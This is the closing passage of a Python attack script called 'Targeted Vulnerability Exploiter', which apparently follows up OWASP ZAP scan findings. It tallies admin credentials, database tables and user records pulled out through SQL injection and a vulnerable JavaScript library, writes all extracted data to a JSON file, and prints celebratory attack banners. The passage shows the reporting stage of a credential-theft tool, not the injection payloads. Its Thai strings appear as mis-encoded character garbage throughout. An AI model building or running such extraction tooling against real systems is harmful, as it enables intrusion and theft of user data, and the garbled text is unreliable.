                    'total_vulnerabilities_targeted': total_vulnerabilities,
                    'successful_exploits': successful_exploits,
                    'success_rate_percentage': self.extraction_results['exploit_success_rate'],
                    'execution_time_seconds': execution_time,
                    'admin_credentials_extracted': len(self.extraction_results.get('admin_credentials', [])),
                    'database_tables_discovered': len(self.extraction_results.get('database_schema', {})),
                    'user_records_extracted': sum(len(v) if isinstance(v, list) else 1 for v in self.extraction_results.get('user_credentials', {}).values())
                },
                'extracted_data': self.extraction_results,
                'zap_vulnerabilities_status': {
                    'sql_injection_login': 'exploited' if admin_data else 'failed',
                    'sqlite_time_based': 'exploited' if schema_data or user_data else 'failed', 
                    'vulnerable_js_library': 'exploited' if 'vulnerable_js_library' in self.extraction_results else 'failed'
                }
            }
            
            # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå
            filename = f"targeted_exploitation_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(final_results, f, ensure_ascii=False, indent=2)
                
            self.log_message("=== ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á ===", "CRITICAL")
            self.log_message(f"‚úÖ ‡∏≠‡∏±‡∏ï‡∏£‡∏≤‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à: {self.extraction_results['exploit_success_rate']:.1f}%", "SUCCESS")
            self.log_message(f"üëë Admin credentials: {len(self.extraction_results.get('admin_credentials', []))} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£", "SUCCESS")
            self.log_message(f"üóÑÔ∏è Database tables: {len(self.extraction_results.get('database_schema', {}))} ‡∏ï‡∏≤‡∏£‡∏≤‡∏á", "SUCCESS")
            self.log_message(f"üë• User records: {sum(len(v) if isinstance(v, list) else 1 for v in self.extraction_results.get('user_credentials', {}).values())} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£", "SUCCESS")
            self.log_message(f"üìÑ ‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡πÉ‡∏ô: {filename}", "INFO")
            
            return final_results
            
        except Exception as e:
            self.log_message(f"‚ùå Critical Error ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ: {str(e)}", "ERROR")
            return None

if __name__ == "__main__":
    print("üéØ Targeted Vulnerability Exploiter - Team B Panama8888b")
    print("üî• ‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á‡∏ï‡∏≤‡∏°‡∏ú‡∏• OWASP ZAP Scan")
    print("üíÄ ‡∏°‡∏∏‡πà‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏ó‡∏µ‡πà‡∏£‡∏∞‡∏ö‡∏∏‡πÄ‡∏â‡∏û‡∏≤‡∏∞")
    print("‚ö†Ô∏è  ‡πÉ‡∏ä‡πâ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ‡∏£‡∏±‡∏ö‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô")
    print("="*70)
    
    exploiter = TargetedVulnExploiter()
    results = exploiter.run_targeted_exploitation()
    
    if results:
        print(f"\nüéâ ‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô!")
        print(f"üìä ‡∏≠‡∏±‡∏ï‡∏£‡∏≤‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à: {results['exploitation_summary']['success_rate_percentage']:.1f}%")
        print(f"üëë ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin: {results['exploitation_summary']['admin_credentials_extracted']} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
        print(f"üìã ‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•: {results['exploitation_summary']['database_tables_discovered']} ‡∏ï‡∏≤‡∏£‡∏≤‡∏á") 
        print(f"üë• ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ: {results['exploitation_summary']['user_records_extracted']} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
        print(f"‚è±Ô∏è ‡πÄ‡∏ß‡∏•‡∏≤‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ: {results['exploitation_summary']['execution_time_seconds']:.1f} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ")
    else:
        print("\n‚ùå ‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÑ‡∏°‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à")
        
    print("\n" + "="*70)
    print("üîí ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏: ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏î‡∏∂‡∏á‡∏°‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏£‡∏∞‡∏ö‡∏ö")
    print("üìä ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏ô‡∏µ‡πâ‡πÅ‡∏™‡∏î‡∏á‡∏£‡∏∞‡∏î‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏™‡∏µ‡πà‡∏¢‡∏á‡∏à‡∏£‡∏¥‡∏á‡∏Ç‡∏≠‡∏á‡∏£‡∏∞‡∏ö‡∏ö")